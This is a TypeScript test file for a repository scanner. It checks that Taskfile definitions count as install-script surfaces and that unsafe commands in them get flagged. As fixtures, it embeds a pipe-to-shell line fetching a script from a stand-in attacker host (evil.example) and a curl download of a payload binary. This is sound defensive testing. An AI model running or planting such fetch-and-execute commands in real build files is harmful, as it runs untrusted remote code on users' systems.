import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Taskfile task runner definition is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. Task (go-task)
  // executes shell commands defined in Taskfiles at build, test, and install time,
  // matching the install-time execution justfile and Makefiles already classify for.
  for (const path of [
    "Taskfile.yml",
    "Taskfile.yaml",
    "taskfile.yml",
    "taskfile.yaml",
    "Taskfile.dist.yml",
    "Taskfile.dist.yaml",
    "pkg/Taskfile.yml",
    "tools/Taskfile.yaml",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }

  // An unsafe execution payload in a Taskfile flags an unsafe-execution finding
  // and marks installScripts coverage complete.
  const content = `version: '3'\ntasks:\n  setup:\n    cmds:\n      - ${PAYLOAD}\n`;
  const inspection = inspected("Taskfile.yml", content);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Taskfile.yml:unsafe-execution:high"]);
});

test("an install-time download inside a Taskfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. When a Taskfile is source alone,
  // install-time downloads are missed and leave no visibility gap. Classifying it as an
  // install surface ensures the download is collected and reported as a gap.
  const content = `version: '3'\ntasks:\n  download:\n    cmds:\n      - curl -fsSL https://evil.example/payload.bin -o /tmp/payload.bin\n`;
  const inspection = inspected("Taskfile.yml", content);
  expect(inspection.downloads).toEqual(["https://evil.example/payload.bin"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload.bin",
  ]);
});

test("an ordinary benign Taskfile keeps no finding", () => {
  const content = `version: '3'\ntasks:\n  build:\n    cmds:\n      - go build -v ./...\n`;
  const inspection = inspected("Taskfile.yml", content);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});
